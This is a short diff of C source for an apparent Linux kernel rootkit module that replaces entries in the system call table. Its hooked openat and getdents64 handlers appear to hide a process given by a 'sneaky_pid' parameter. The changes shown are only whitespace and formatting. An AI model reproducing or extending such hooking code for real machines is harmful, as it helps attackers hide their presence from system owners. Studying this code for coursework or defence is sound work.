@@ -16,7 +16,7 @@
 
 // This is a pointer to the system call table
 static unsigned long *sys_call_table;
-static char * sneaky_pid;
+static char *sneaky_pid;
 module_param(sneaky_pid, charp, 0660);
 
 // Helper functions, turn on and off the PTE address protection mode
@@ -68,6 +68,7 @@ asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
   return (*original_openat)(regs);
 }
 
+
 asmlinkage ssize_t (*original_getdents64)(struct pt_regs *);
 
 asmlinkage ssize_t sneaky_sys_getdents(struct pt_regs *regs)
@@ -107,7 +108,6 @@ asmlinkage ssize_t sneaky_sys_getdents(struct pt_regs *regs)
       {
         pos = pos + cur->d_reclen;	
       }
-      
     }
   }
   return bytes_read;
